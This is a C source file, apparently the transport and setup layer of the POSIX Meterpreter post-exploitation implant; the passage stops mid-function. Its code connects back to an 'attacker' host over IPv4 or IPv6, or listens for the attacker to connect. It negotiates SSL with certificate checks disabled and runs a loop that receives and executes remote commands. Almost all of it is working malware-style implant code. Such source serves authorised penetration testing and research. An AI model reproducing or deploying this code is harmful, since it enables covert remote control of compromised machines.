/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <netdb.h>
#include <netinet/in.h>

// #define DEBUGTRACE 1

#define TRANSPORT_ID_OFFSET 22

MetsrvConfigData global_config =
{
	.transport = "METERPRETER_TRANSPORT_SSL\x00\x00",
	.url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00\x00",
	.ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
	.timeouts.values = { .expiry = 24*3600*7, .comms = 300, .retry_total = 3600, .retry_wait = 10 }
};

#define SetHandleInformation(a, b, c)
const unsigned int hAppInstance = 0x504b5320;	// 'PKS '

/*! @brief An array of locks for use by OpenSSL. */
static LOCK **ssl_locks = NULL;

/*!
 * @brief Perform the reverse_tcp connect.
 * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @param expiry The session expiry time.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait, int expiry)
{
	DWORD result = ERROR_SUCCESS;
	int start = current_unix_timestamp();

	do
	{
		int retryStart = current_unix_timestamp();
		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
		{
			break;
		}

		// has our session expired?
		if (current_unix_timestamp() >= expiry)
		{
			break;
		}

		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
		sleep(retryWait);
	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);

	if (result == SOCKET_ERROR)
	{
		closesocket(reverseSocket);
	}

	return result;
}

/*!
 * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @param expiry The session expiry time.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
{
	// prepare to connect to the attacker
	DWORD result = ERROR_SUCCESS;
	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* target = gethostbyname(host);
	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);

	struct sockaddr_in sock = { 0 };

	sock.sin_addr.s_addr = inet_addr(targetIp);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	*socketBuffer = 0;

	result = reverse_tcp_run(socketHandle, (struct sockaddr*)&sock, sizeof(sock), retryTotal, retryWait, expiry);

	if (result == ERROR_SUCCESS)
	{
		*socketBuffer = socketHandle;
	}

	return result;
}


/*!
 * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param service The target service/port.
 * @param scopeId IPv6 scope ID.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @param expiry Session expiry time.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
{
	int start;
	DWORD result = ERROR_SUCCESS;
	SOCKET socketHandle;
	struct addrinfo hints = { 0 };

	*socketBuffer = 0;

	hints.ai_family = AF_INET6;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	struct addrinfo* addresses;
	if (getaddrinfo(host, service, &hints, &addresses) != 0)
	{
		return errno;
	}

	// prepare to connect to the attacker
	socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (socketHandle == INVALID_SOCKET)
	{
		dprintf("[STAGELESS IPV6] failed to connect to attacker");
		return errno;
	}

	start = current_unix_timestamp();
	do
	{
		struct addrinfo* address = NULL;
		int retryStart = current_unix_timestamp();
		for (address = addresses; address != NULL; address = address->ai_next)
		{
			((struct sockaddr_in6*)address->ai_addr)->sin6_scope_id = scopeId;

			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
			{
				dprintf("[STAGELESS IPV6] Socket successfully connected");
				*socketBuffer = socketHandle;
				freeaddrinfo(addresses);
				return ERROR_SUCCESS;
			}
		}

		// has our session expired?
		if (current_unix_timestamp() >= expiry)
		{
			break;
		}

		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
		sleep(retryWait);
	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);

	closesocket(socketHandle);
	freeaddrinfo(addresses);

	return errno;
}

/*!
 * @brief Perform the bind_tcp process.
 * @param listenSocket The existing listen socket that refers to the remote host connection, closed before returning.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
 * @return Indication of success or failure.
 */
static DWORD bind_tcp_run(SOCKET listenSocket, struct sockaddr* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
{
	SOCKET acceptSocket;
	DWORD result = ERROR_SUCCESS;

	do
	{
		int yes = 1;
		if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) != 0)
		{
			dprintf("[BIND RUN] Failed to set sock opt: %u", errno);
			result = errno;
			break;
		}

		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
		{
			dprintf("[BIND RUN] Socket failed to bind: %u", errno);
			result = errno;
			break;
		}

		dprintf("[BIND RUN] Socket bound successfully");

		if (listen(listenSocket, 1) == SOCKET_ERROR)
		{
			result = errno;
			break;
		}

		dprintf("[BIND RUN] Listening ...");

		// Setup, ready to go, now wait for the connection.
		acceptSocket = accept(listenSocket, NULL, NULL);

		if (acceptSocket == INVALID_SOCKET)
		{
			result = errno;
			break;
		}

		dprintf("[BIND RUN] Valid socket accepted %u", acceptSocket);

		*acceptSocketBuffer = acceptSocket;
	} while (0);

	closesocket(listenSocket);

	return result;
}

/*!
 * @brief Listens on a port for an incoming payload request.
 * @param port Port number to listen on.
 */
DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// prepare a connection listener for the attacker to connect to, and we
	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
	// only if the process fails.
	BOOL v4Fallback = FALSE;
	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (listenSocket == INVALID_SOCKET)
	{
		dprintf("[BIND] Unable to create IPv6 socket");
		v4Fallback = TRUE;
	}
	else
	{
		int no = 0;
		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
		{
			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
			// so instead, we'll just revert back to v4 and listen on that one address instead.
			dprintf("[BIND] Unable to remove IPV6_ONLY option");
			closesocket(listenSocket);
			v4Fallback = TRUE;
		}
	}

	if (v4Fallback)
	{
		dprintf("[BIND] Falling back to IPV4");
		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	}

	struct sockaddr_in6 sockAddr = { 0 };

	if (v4Fallback)
	{
		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
		v4Addr->sin_family = AF_INET;
		v4Addr->sin_port = htons(port);
	}
	else
	{
		sockAddr.sin6_addr = in6addr_any;
		sockAddr.sin6_family = AF_INET6;
		sockAddr.sin6_port = htons(port);
	}

	return bind_tcp_run(listenSocket, (struct sockaddr*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
}


/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static void server_locking_callback(int mode, int type, const char *file, int line)
{
	if (mode & CRYPTO_LOCK) {
		lock_acquire(ssl_locks[type]);
	} else {
		lock_release(ssl_locks[type]);
	}
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static long unsigned int server_threadid_callback(void)
{
	return pthread_self();
}

/*!
 * @brief A callback function for dynamic lock creation for OpenSSL.
 * @returns A pointer to a lock that can be used for synchronisation.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, int line)
{
	return (struct CRYPTO_dynlock_value *)lock_create();
}

/*!
 * @brief A callback function for dynamic lock locking for OpenSSL.
 * @param mode A bitmask which indicates the lock mode.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, const char *file,
	int line)
{
	LOCK *lock = (LOCK *) l;
	if (mode & CRYPTO_LOCK) {
		lock_acquire(lock);
	} else {
		lock_release(lock);
	}
}

/*!
 * @brief A callback function for dynamic lock destruction for OpenSSL.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const char *file, int line)
{
	lock_destroy((LOCK *) l);
}

/*!
 * @brief Flush all pending data on the connected socket before doing SSL.
 * @param remote Pointer to the remote instance.
 */
static void server_socket_flush(Remote * remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	fd_set fdread;
	DWORD ret;
	char buff[4096];
	lock_acquire(remote->lock);

	while (1) {
		struct timeval tv;
		LONG data;
		FD_ZERO(&fdread);
		FD_SET(ctx->fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
		if (data == 0)
			break;

		ret = recv(ctx->fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);

		// The socket closed while we waited
		if (ret == 0) {
			break;
		}
	}
	lock_release(remote->lock);
}

/*!
 * @brief Poll a socket for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out (in milliseconds).
 * @return Indication of success or failure.
 */
static LONG server_socket_poll(Remote * remote, long timeout)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	struct timeval tv;
	LONG result;
	fd_set fdread;

	lock_acquire(remote->lock);
	FD_ZERO(&fdread);
	FD_SET(ctx->fd, &fdread);
	tv.tv_sec = 0;
	tv.tv_usec = timeout;
	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);

	if (result == -1 && (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)) {
		result = 0;
	}

	lock_release(remote->lock);
	return result;
}

/*!
 * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
static int server_initialize_ssl(Remote * remote)
{
	int i;

	lock_acquire(remote->lock);

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
	if (ssl_locks == NULL) {
			dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
		lock_release(remote->lock);
		return -1;
	}

	for (i = 0; i < CRYPTO_num_locks(); i++) {
		ssl_locks[i] = lock_create();
	}

	CRYPTO_set_id_callback(server_threadid_callback);
	CRYPTO_set_locking_callback(server_locking_callback);
	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
	lock_release(remote->lock);

	return 0;
}

/*!
 * @brief Bring down the OpenSSL subsystem
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
BOOL server_destroy_ssl(Remote * remote)
{
	TcpTransportContext* ctx = NULL;
	int i;

	if (remote) {
		dprintf("[SERVER] Destroying SSL");
		lock_acquire(remote->lock);
		if (remote->transport && remote->transport->ctx) {
			ctx = (TcpTransportContext*)remote->transport->ctx;
			SSL_free(ctx->ssl);
			SSL_CTX_free(ctx->ctx);
		}
		CRYPTO_set_locking_callback(NULL);
		CRYPTO_set_id_callback(NULL);
		CRYPTO_set_dynlock_create_callback(NULL);
		CRYPTO_set_dynlock_lock_callback(NULL);
		CRYPTO_set_dynlock_destroy_callback(NULL);

		for (i = 0; i < CRYPTO_num_locks(); i++) {
			lock_destroy(ssl_locks[i]);
		}

		free(ssl_locks);
		lock_release(remote->lock);
	}

	return TRUE;
}

/*!
 * @brief Negotiate SSL on the socket.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
static BOOL server_negotiate_ssl(Remote * remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	BOOL success = TRUE;
	DWORD ret = 0;
	DWORD res = 0;
	lock_acquire(remote->lock);

	ctx->meth = TLSv1_client_method();
	ctx->ctx = SSL_CTX_new(ctx->meth);
	SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
	ctx->ssl = SSL_new(ctx->ctx);
	SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
	if (SSL_set_fd(ctx->ssl, ctx->fd) == 0) {
		dprintf("[SERVER] set fd failed");
		success = FALSE;
		goto out;
	}

	do {
		if ((ret = SSL_connect(ctx->ssl)) != 1) {
			res = SSL_get_error(ctx->ssl, ret);
			dprintf("[SERVER] connect failed %d\n", res);
			if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {

				// Catch non-blocking socket errors and retry
				continue;
			}
			success = FALSE;
			break;
		}
	} while (ret != 1);

	if (success == FALSE)
		goto out;

	dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
	if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0) {
		dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret,
			SSL_get_error(ctx->ssl, ret));
	}

out:
	lock_release(remote->lock);
	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
	if (ret < 0) {
		success = FALSE;
	}
	return success;
}

/*!
 * @brief Transmit a packet via SSL _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
 */
DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
{
	CryptoContext* crypto;
	Tlv requestId;
	DWORD res;
	DWORD idx;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;

		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
		{
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
		}

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

		idx = 0;
		while (idx < sizeof(packet->header))
		{
			// Transmit the packet's header (length, type)
			res = SSL_write(
				ctx->ssl,
				(LPCSTR)(&packet->header) + idx,
				sizeof(packet->header) - idx
				);

			if (res <= 0)
			{
				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
				break;
			}
			idx += res;
		}

		if (res < 0)
		{
			break;
		}

		idx = 0;
		while (idx < packet->payloadLength)
		{
			// Transmit the packet's payload (length, type)
			res = SSL_write(
				ctx->ssl,
				packet->payload + idx,
				packet->payloadLength - idx
				);

			if (res < 0)
			{
				break;
			}

			idx += res;
		}

		if (res < 0)
		{
			dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief Receive a new packet on the given remote endpoint.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	TlvHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	do
	{
		// Read the packet length
		while (inHeader)
		{
			if ((bytesRead = SSL_read(ctx->ssl, ((PUCHAR)&header + headerBytes), sizeof(TlvHeader)-headerBytes)) <= 0)
			{
				if (!bytesRead)
				{
					SetLastError(ERROR_NOT_FOUND);
				}

				if (bytesRead < 0)
				{
					dprintf("[PACKET] receive header failed with error code %d. SSLerror=%d, WSALastError=%d\n", bytesRead, SSL_get_error(ctx->ssl, bytesRead), WSAGetLastError());
					SetLastError(ERROR_NOT_FOUND);
				}

				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(TlvHeader))
			{
				continue;
			}

			inHeader = FALSE;
		}

		if (headerBytes != sizeof(TlvHeader))
		{
			break;
		}

		// Initialize the header
		header.length = header.length;
		header.type = header.type;
		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		while (payloadBytesLeft > 0)
		{
			if ((bytesRead = SSL_read(ctx->ssl, payload + payloadLength - payloadBytesLeft, payloadBytesLeft)) <= 0)
			{

				if (GetLastError() == WSAEWOULDBLOCK)
				{
					continue;
				}

				if (!bytesRead)
				{
					SetLastError(ERROR_NOT_FOUND);
				}

				if (bytesRead < 0)
				{
					dprintf("[PACKET] receive payload of length %d failed with error code %d. SSLerror=%d\n", payloadLength, bytesRead, SSL_get_error(ctx->ssl, bytesRead));
					SetLastError(ERROR_NOT_FOUND);
				}

				break;
			}

			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @returns Indication of success or failure.
 */
static BOOL server_dispatch_tcp(Remote * remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet *packet = NULL;
	THREAD *cpt = NULL;
	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS) {
		return result;
	}
	while (running) {
		if (event_poll(dispatchThread->sigterm, 0)) {
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}
		result = server_socket_poll(remote, 500000);
		if (result > 0) {
			result = packet_receive_via_ssl(remote, &packet);
			if (result != ERROR_SUCCESS) {
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}
			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}

		else if (result < 0) {
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] calling scheduler_destroy...")
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...")
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");
	return result;
}

/*!
 * @brief Destroy the TCP transport.
 * @param transport Pointer to the TCP transport to reset.
 */
static void transport_destroy_tcp(Remote* remote)
{
	if (remote && remote->transport && remote->transport->type == METERPRETER_TRANSPORT_SSL)
	{
		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
		SAFE_FREE(remote->transport->url);
		SAFE_FREE(remote->transport->ctx);
		SAFE_FREE(remote->transport);
	}
}

/*!
 * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
 * @param transport Pointer to the TCP transport to reset.
 */
static void transport_reset_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
	{
		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
		if (ctx->fd)
		{
			closesocket(ctx->fd);
		}
		ctx->fd = 0;
	}
}

/*!
 * @brief Attempt to determine if the stager connection was a bind or reverse connection.
 * @param ctx Pointer to the current \c TcpTransportContext.
 * @param sock The socket file descriptor passed in to metsrv.
 * @remark This function always "succeeds" because the fallback case is reverse_tcp.
 */
static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
{
	// if we get here it means that we've been given a socket from the stager. So we need to stash
	// that in our context. Once we've done that, we need to attempt to infer whether this conn
	// was created via reverse or bind, so that we can do the same thing later on if the transport
	// fails for some reason.
	SOCKET listenSocket;

	ctx->fd = sock;

	// default to reverse socket
	ctx->bound = FALSE;

	// for sockets that were handed over to us, we need to persist some information about it so that
	// we can reconnect after failure. To support this, we need to first get the socket information
	// which gives us addresses and port information
	ctx->sock_desc_size = sizeof(ctx->sock_desc);
	if (getsockname(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size) != SOCKET_ERROR)
	{
#ifdef DEBUGTRACE
		if (ctx->sock_desc.ss_family == AF_INET)
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
		}
		else
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
		}
#endif
	}
	else
	{
		dprintf("[STAGED] getsockname failed: %u (%x)", GetLastError(), GetLastError());
	}

	// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
	// Loop backwards from our current socket FD number
	for (int i = 1; i <= 64; ++i)
	{
		// Windows socket handles are always multiples of 4 apart.
		listenSocket = ctx->fd - i;

		dprintf("[STAGED] Checking socket fd %u", listenSocket);

		BOOL isListening = FALSE;
		int isListeningLen = sizeof(isListening);
		if (getsockopt(listenSocket, SOL_SOCKET, SO_ACCEPTCONN, (char*)&isListening, &isListeningLen) == SOCKET_ERROR)
		{
			dprintf("[STAGED] Couldn't get socket option to see if socket was listening: %u %x", GetLastError(), GetLastError());
			continue;
		}

		if (!isListening)
		{
			dprintf("[STAGED] Socket appears to NOT be listening");
			continue;
		}

		// try to get details of the socket address
		struct sockaddr_storage listenStorage;
		int listenStorageSize = sizeof(listenStorage);
